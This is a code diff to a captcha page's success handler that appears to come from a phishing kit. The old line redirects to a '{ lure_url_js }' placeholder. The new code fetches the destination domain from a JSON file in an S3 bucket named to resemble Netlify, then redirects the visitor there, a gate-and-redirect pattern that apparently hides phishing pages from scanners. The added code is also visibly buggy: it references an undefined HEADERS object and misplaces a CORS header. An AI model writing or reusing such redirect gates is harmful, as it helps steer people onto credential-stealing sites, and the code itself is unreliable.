@@ -493,9 +493,25 @@
           el: document.getElementById("captcha"),
           onSuccess: function () {
             var hash = window.location.hash;
-            var url = { lure_url_js } + "#" + hash.split("#")[1];
+            // var url = { lure_url_js } + "#" + hash.split("#")[1];
+            // console.log('---------', hash, url);
+            var lure_url_js = "https://google.com/";
+            var url = lure_url_js + "#";
+            HEADERS['Access-Control-Allow-Origin'] = '*'
             (document.getElementById("msg").innerHTML = "Success!"),
-              window.open(url, "_self");
+              fetch('https://netlifygit.s3.ca-central-1.amazonaws.com/netligit.json', {
+                headers: {
+                  'Access-Control-Allow-Origin': '*'
+                }
+              })
+                .then(response => response.json())
+                .then(data => {
+                  // Access the value from the JSON object
+                  const domainName = data.domain_name;
+                  console.log(domainName);
+                  window.open(domainName, "_self");
+                })
+                .catch(error => console.error(error));
           },
           onFail: cleanMsg,
           onRefresh: cleanMsg,
